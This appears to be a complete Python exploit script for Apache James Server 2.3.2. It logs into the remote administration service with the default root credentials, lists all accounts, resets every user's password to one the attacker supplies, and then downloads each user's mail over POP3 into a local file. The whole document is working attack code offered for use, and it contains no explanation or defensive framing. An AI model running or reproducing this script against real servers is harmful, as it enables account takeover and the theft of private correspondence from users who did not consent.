#!/usr/bin/env python3
"""
Title: JamesSrvMails.py
Author: pwnd_root
Application: James Server v2.3.2
Description: Reads mail from POP3 mail server, by exploiting the default configurations
             of Apache James Server v2.3.2 or with a working admin user:pass for James
             Remote Administrator Tool
"""
# import calls
import sys
import argparse
import socket
import poplib

# global variables
numUsers = 0
userList = []
users = "users.txt"


# Gets and parses the args supplied on the command-line. Returns the parsed options
def getArgs ():

    parser = argparse.ArgumentParser ()
    parser.add_argument ("target", action = "store", help = "Target host")
    parser.add_argument ("-p", action = "store", dest = "targetPort", help = "Target Port. Default-4555",
                         default = 4555)
    parser.add_argument ("-N", action = "store", dest = "newPass", help = "New password", default = "Offsec!")
    parser.add_argument ("-U", action = "store", dest = "juser", help = "James RAT user", default = "root")
    parser.add_argument ("-P", action = "store", dest = "jpass", help = "James RAT pass", default = "root")

    options = parser.parse_args ()

    return options


# Connects and authenticates as user:pass and upon success, returns the connected socket
def authenticate (target, targetPort, juser, jpass):

    ret = 0
    sock = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock.connect ((target, targetPort))
        print ("[+] Connected to " + target + ":" + str(targetPort))
        sock.recv (2048)
        temp = juser + "\n"
        sock.send (temp.encode())
        sock.recv (2048)
        temp = jpass + "\n"
        sock.send (temp.encode())
        response = sock.recv (2048)
        temp = response.decode ()
        flag = temp.split (' ')[0]

        if flag == "Welcome":
            print ("\t[+] Authenticated as " + juser)
            ret = sock
        else:
            print ("[!] Authentication as " + juser + "Failed")
            ret = 0

    except socket.error as e:
        print ("[!] Socket Error")

    return ret


# Processes the list of users received from James RAT and stores them in a list
def processUsers (users):

    global userList
    global numUsers
    with open (users) as uFl:
        line = uFl.readline ().strip ()
        numUsers = line.split (' ')[2]
        for i in range (int(numUsers)):
            line = uFl.readline ().strip ()
            userList.append (line.split (' ')[1])


# Changes the password of every user present on James RAT
def changePassword (sock, newPass):

    global userList
    global numUsers

    temp = "listusers" + "\n"
    sock.send (temp.encode())
    response = sock.recv (4096)
    with open (users, "w") as uFl:
        uFl.write (response.decode ())
    print ("\t[+] Users found are written to " + users)
    processUsers (users)

    for i in userList:
        temp = "setpassword " + i + " " + newPass + "\n"
        sock.send (temp.encode())


# Connects to the POP3 server (port-110) and reads the mails for every user
def readMails (target, newPass):

    global userList
    global numUsers
    mails = "mails.txt"

    print ("[+] Connecting to POP3")

    for num in range (int(numUsers)):
        try:
            popServer = poplib.POP3(target, 110)
            print ("\t[+] User: " + userList[num])
            popServer.user (userList[num])
            popServer.pass_ (newPass)
            mailbox = popServer.stat ()
            numMail = mailbox [0]
            print ("\t\t[+] Reading Mails")

            if numMail:
                with open (mails, "a") as mFl:
                    mFl.write (userList[num] + "\n")
                    for i in range (numMail):
                        print ("---------" + "Mail " + str(i + 1) + "---------")
                        mFl.write ("---------" + "Mail " + str(i + 1) + "---------" + "\n")
                        for mail in popServer.retr (i+1)[1]:
                            print (mail)
                            mFl.write (mail)
                            mFl.write ("\n")
                            mFl.write ("---------" + "End of user:" + userList[num] + "---------" + "\n")
            else:
                print ("\t\t[!] No mails found")
                print ("\t[-] Done")

            popServer.quit()

        except:
            print ("Connecting to POP3 Server failed")
            return False
    print("[+] Mails found on server are written to " + mails)
    return True


def main ():

    args = getArgs ()
    target = args.target
    targetPort = args.targetPort
    newPass = args.newPass
    juser = args.juser
    jpass = args.jpass

    sock = authenticate (target, targetPort, juser, jpass)
    if (sock):
        changePassword (sock, newPass)
        if (readMails (target, newPass)):
            print ("[!] Done")
        else:
            sys.exit (0)
    else:
        sys.exit (0)


if __name__ == '__main__':

    main ()